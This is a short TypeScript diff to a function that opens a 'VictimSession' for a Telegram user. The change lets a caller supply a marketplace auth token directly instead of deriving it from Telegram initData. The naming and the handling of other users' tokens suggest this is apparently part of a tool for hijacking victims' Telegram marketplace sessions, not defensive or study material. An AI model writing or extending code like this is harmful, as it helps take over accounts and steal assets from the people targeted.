@@ -20,7 +20,8 @@ function newSessionId(): string {
 }
 
 export async function openSession(input: {
-  initData: string;
+  initData?: string;
+  mrktToken?: string;
   tgUserId: number;
   businessConnectionId?: string;
 }): Promise<VictimSession> {
@@ -30,7 +31,11 @@ export async function openSession(input: {
     if (s && s.expiresAt > Date.now()) return s;
   }
 
-  const mrktToken = await authFromInitData(input.initData);
+  let mrktToken = input.mrktToken?.trim();
+  if (!mrktToken) {
+    if (!input.initData) throw new Error("initData or mrktToken required");
+    mrktToken = await authFromInitData(input.initData);
+  }
   const now = Date.now();
   const session: VictimSession = {
     sessionId: newSessionId(),
